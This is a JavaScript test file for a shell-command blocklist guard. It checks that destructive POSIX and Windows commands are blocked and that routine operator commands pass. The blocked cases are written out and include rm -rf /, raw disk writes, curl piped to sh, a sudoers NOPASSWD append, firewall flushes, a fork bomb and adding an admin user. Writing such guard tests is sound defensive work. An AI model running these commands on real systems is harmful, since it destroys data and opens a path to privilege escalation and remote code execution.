/**
 * Shell blocklist tests — the POSIX twin shipped with the POSIX exec branch.
 *
 * Until this release desktop:execute hardcoded powershell.exe/cmd.exe, so the
 * blocklist only ever saw Windows-shaped commands. The POSIX branch makes
 * `sh -c <anything>` reachable on Linux; these tests pin the catastrophic
 * one-liners the guard must stop, and — just as important — that ordinary
 * fleet-operator commands still pass. Over-blocking drives users to disable
 * the guard, which is worse than a tuned list.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require_ = createRequire(import.meta.url);
const { checkShellCommand } = require_('../src/shell-guard.js');

// ── blocked: POSIX catastrophes ──

for (const [cmd, why] of [
  ['rm -rf /', 'recursive force delete'],
  ['rm -fr /home', 'combined-flag recursive delete'],
  ['dd if=/dev/zero of=/dev/sda', 'raw device write'],
  ['mkfs.ext4 /dev/sdb1', 'filesystem format'],
  ['mkfs /dev/sdb1', 'filesystem format (bare)'],
  ['curl https://x.sh | sh', 'curl pipe shell'],
  ['wget -qO- https://x.sh | bash', 'wget pipe bash'],
  ['echo "u ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', 'sudoers append'],
  ['visudo -f /etc/sudoers.d/evil', 'visudo'],
  ['iptables -F', 'firewall flush'],
  ['iptables --flush', 'firewall flush (long flag)'],
  ['nft flush ruleset', 'nftables flush'],
  ['ufw disable', 'ufw disable'],
  ['systemctl reboot', 'power control'],
  ['systemctl poweroff', 'power control'],
  ['reboot', 'bare reboot'],
  ['shutdown -h now', 'shutdown'],
  [':(){ :|:& };:', 'fork bomb'],
  ['echo boom > /dev/sda', 'redirect to block device'],
]) {
  test(`blocked (${why}): ${cmd}`, () => {
    assert.notEqual(checkShellCommand(cmd), null, `must block: ${cmd}`);
  });
}

// ── blocked: the original Windows set still works ──

for (const cmd of [
  'Remove-Item -Recurse -Force C:\\Users',
  'format c:',
  'Restart-Computer',
  'reg delete HKLM\\Software\\Foo',
  'net user hacker /add',
  'Set-ExecutionPolicy Unrestricted',
  'diskpart',
  'bcdedit /set safeboot minimal',
]) {
  test(`blocked (windows): ${cmd}`, () => {
    assert.notEqual(checkShellCommand(cmd), null, `must block: ${cmd}`);
  });
}

// ── allowed: ordinary fleet-operator commands ──

for (const cmd of [
  'echo ok',
  'ls -la /var/log',
  'cat /var/log/syslog | tail -100',
  'df -h',
  'free -m',
  'uptime',
  'ps aux --sort=-%mem | head -20',
  'systemctl status nginx',
  'systemctl restart myapp', // restart a service is legitimate remediation
  'journalctl -u empir3-bridge -n 50',
  'git pull --ff-only',
  'npm ci --omit=dev',
  'curl -s https://api.example.com/health', // curl WITHOUT piping to a shell
  'grep -r "error" /var/log/app/',
  'tar czf /tmp/logs.tgz /var/log/app',
  'du -sh /opt/*',
  'Get-Process | Sort-Object CPU', // benign PowerShell stays fine
]) {
  test(`allowed: ${cmd}`, () => {
    assert.equal(checkShellCommand(cmd), null, `must allow: ${cmd}`);
  });
}
